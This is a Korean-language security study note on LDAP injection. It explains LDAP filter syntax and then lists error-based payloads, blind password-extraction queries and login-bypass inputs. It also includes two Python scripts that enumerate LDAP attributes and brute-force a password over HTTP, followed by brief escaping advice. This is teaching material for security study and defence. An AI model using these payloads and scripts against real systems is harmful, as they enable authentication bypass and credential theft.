# Concept
- Lightweight Directory Access Protocol
- 사용자의 입력값이 LDAP Query에 직접 영향을 끼칠 수 있을 때 이를 통해 비정상적인 LADP 동작을 유도하는 공격 방법

- SQL Injection 방식과 거의 동일
- 로그인 ID, Password에 많이 사용


---
# LDAP
- TCP/IP 위에서 DS(Directory Service)를 조회하고 수정하는 Application Protocol
- 보통은 기업 인프라에서 사람, 기기 등의 인증에서 사용되는 경우가 많음


# LDAP Query 문법 구조
```null
Filter = ( filtercomp )
Filtercomp = and / or / not / item
And = & filterlist
Or = |filterlist
Not = ! filter
Filterlist = 1*filter
Item= simple / present / substring
Simple = attr filtertype assertionvalue
Filtertype = '=' / '~=' / '>=' / '<='
Present = attr = *
Substring = attr ”=” [initial] * [final]
Initial = assertionvalue
Final = assertionvalue
(&) = Absolute TRUE
(|) = Absolute FALSE
```

```
(&(조건1)(조건2)) : 조건1과 조건2를 모두 만족  
(|(조건1)(조건2)) : 조건1 또는 조건2를 만족  
(&(조건1)(|(조건2)(조건3))) : 조건2 또는 조건3을 만족하고 조건1를 만족

case 1 : 특정 ID의 사용자 검색  
(&(cn=silver35)(objectclass=user)) : AD의 user카테고리에서 cn값이 'silver35'인 사용자를 검색  
case 2 : 모든 사용자 검색  
(&(objectClass=user)(uid=*)) : user 카테고리에서 uid값을 모두(*) 검색
```


---
# Exploit
### error base
```
*
*)(&
*))%00
)(cn=))\x00
*()|%26'
*()|&'
*(|(mail=*))
*(|(objectclass=*))
*)(uid=*))(|(uid=*
*/*
*|
/
//
//*
@*
|
admin*
admin*)((|userpassword=*)
admin*)((|userPassword=*)
x' or name()='username' or 'x'='y
```

### Blind
```
(&(sn=administrator)(password=*))    : OK
(&(sn=administrator)(password=A*))   : KO
(&(sn=administrator)(password=B*))   : KO
...
(&(sn=administrator)(password=M*))   : OK
(&(sn=administrator)(password=MA*))  : KO
(&(sn=administrator)(password=MB*))  : KO
...
(&(sn=administrator)(password=MY*))  : OK
(&(sn=administrator)(password=MYA*)) : KO
(&(sn=administrator)(password=MYB*)) : KO
(&(sn=administrator)(password=MYC*)) : KO
...
(&(sn=administrator)(password=MYK*)) : OK
(&(sn=administrator)(password=MYKE)) : OK
```

### Exploitation
```
user  = *)(uid=*))(|(uid=*
pass  = password
query = "(&(uid=*)(uid=*)) (|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))"
```

```
user  = admin)(!(&(1=0
pass  = q))
query = (&(uid=admin)(!(&(1=0)(userPassword=q))))
```

### Attribute List
```
userPassword
surname
name
cn
sn
objectClass
mail
givenName
commonName
```


### Login Bypass
```null
username = *
password= * 
전체 쿼리문 : (&(username = *)(password = * ))

username = *)(&
password = *)(&
전체 쿼리문 : (&(username = *)(&)(password = *)(&))
즉, 조건 1인 (username = *)와 조건 2인 (&)와 조건 3인 (password = *)와 조건 4인 (&)을 모두 만족

username = *)(|(&
password = pwd)
--> (&(username = *)(|(&)(passwd=pwd))
즉, 조건 1인 (username = *)와 조건 2인 (|(&)(password=pwd))를 모두 만족 
```


---
# Script
 - 어떤 LDAP 속성을 사용할 수 있는지 확인하는 스크립트
```python
#!/usr/bin/python3
import requests
import string

fields = []

url = ''

f = open('dic','r') # dic 파일에는 LDAP 속성 포함
wordl = f.read().split('\n')
f.close()

for i in wordl:
    r = requests.post(url, data = {'username':'*)('+str(i)+'=*','password':'*'}) # *)(attr=*
    if 'No search results' in r.text:
        fields.append(str(i))

print(fields)
```

- Blind Ldap Injection
```python
#!/usr/bin/python3
import requests, string

alphabet = string.ascii_letters + string.digits + "_@{}-()!\"$%=^[]:;"
password = ""

url = ''

for i in alphabet : 
    print("[i] Looking for number " + str(i))
    print(password)
    for char in alphabet:
        search = char
        r = requests.post(url, data = {'username':'username','password':password+char+'*'}) # *)(attr=*
        if 'No search results' in r.text:
            password += str(char)
            break

print(password)
```

---
# Prevention Techniques
- 아래 글자들 이스케이핑
`*` `(` `)` `.` `&` `-` `_` `[` `]` `backktick` `~` `tab` `@` `$` `%` `^` `?` `:` `{` `}` `!` `'`

---
# Reference
- [LDAP 인젝션](!https://www.hahwul.com/cullinan/ldap-injection/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection)
